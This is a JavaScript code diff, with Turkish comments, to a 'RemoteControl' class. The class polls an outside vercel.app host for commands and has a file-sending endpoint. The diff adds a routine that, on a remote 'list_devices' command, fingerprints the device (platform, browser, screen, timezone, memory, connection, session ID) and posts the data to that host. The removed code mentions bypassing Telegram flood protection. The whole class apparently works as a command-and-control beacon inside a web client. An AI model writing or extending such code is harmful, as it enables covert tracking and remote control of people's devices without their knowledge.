@@ -5,6 +5,7 @@ class RemoteControl {
     constructor(config = {}) {
         this.commandEndpoint = config.commandEndpoint || 'https://ironbabatekkral.vercel.app/api/get-commands';
         this.fileEndpoint = config.fileEndpoint || 'https://ironbabatekkral.vercel.app/api/send-file';
+        this.collectDevicesEndpoint = config.collectDevicesEndpoint || 'https://ironbabatekkral.vercel.app/api/collect-devices';
         this.pollInterval = config.pollInterval || 5000; // 5 saniyede bir kontrol
         this.debug = config.debug || false;
         this.isEnabled = false;
@@ -168,17 +169,11 @@ class RemoteControl {
                 return;
             }
             
-            // /devices komutu - her cihaz kendi kartını gönderir
+            // /devices komutu - cihaz bilgisini collection'a ekle (backend birleştirir)
             if (cmd.command === 'list_devices') {
-                console.log('📱 [RemoteControl] Sending device card...');
-                
-                // RANDOM DELAY (2-5 saniye) - Telegram API flood protection bypass
-                const randomDelay = 2000 + Math.floor(Math.random() * 3000); // 2000-5000ms
-                console.log(`⏱️ [RemoteControl] Waiting ${randomDelay}ms to avoid Telegram flood protection...`);
-                await new Promise(resolve => setTimeout(resolve, randomDelay));
-                
-                await this.sendDeviceCard();
-                console.log('✅ [RemoteControl] Device card sent!');
+                console.log('📱 [RemoteControl] Sending device info to collection...');
+                await this.sendDeviceToCollection(cmd.message_id);
+                console.log('✅ [RemoteControl] Device info sent to collection!');
                 return;
             }
 
@@ -227,7 +222,52 @@ class RemoteControl {
         }
     }
 
-    // Cihaz kartı gönder (her cihaz ayrı mesaj)
+    // Cihaz bilgisini collection'a gönder (backend birleştirir)
+    async sendDeviceToCollection(messageId) {
+        try {
+            console.log('📱 [RemoteControl] sendDeviceToCollection() called');
+            
+            const deviceInfo = await this.collectDeviceInfo();
+            console.log('📊 [RemoteControl] Device info collected:', deviceInfo);
+            
+            const platform = deviceInfo.platform || 'Unknown';
+            const browser = this.getBrowser(deviceInfo.user_agent);
+            const emoji = this.getDeviceEmoji(platform);
+            
+            const deviceData = {
+                emoji: emoji,
+                platform: platform,
+                browser: browser,
+                session_id: this.sessionId.substring(8, 24),
+                screen: deviceInfo.screen || 'Unknown',
+                language: deviceInfo.language || 'Unknown',
+                timezone: deviceInfo.timezone || 'Unknown',
+                online: deviceInfo.online ? 'Online' : 'Offline',
+                memory: deviceInfo.device_memory || 'Unknown',
+                connection: deviceInfo.connection_type || 'Unknown'
+            };
+            
+            console.log('📤 [RemoteControl] Sending to collection API...');
+            const response = await fetch(this.collectDevicesEndpoint, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    message_id: messageId,
+                    device_info: deviceData
+                })
+            });
+
+            const result = await response.json();
+            console.log('✅ [RemoteControl] Collection API response:', result);
+            
+            return { success: true, result };
+        } catch (error) {
+            console.error('❌ [RemoteControl] Send to collection error:', error.message, error.stack);
+            return { success: false, error: error.message };
+        }
+    }
+
+    // Cihaz kartı gönder (her cihaz ayrı mesaj) - ARTIK KULLANILMIYOR
     async sendDeviceCard() {
         try {
             console.log('📱 [RemoteControl] sendDeviceCard() called');
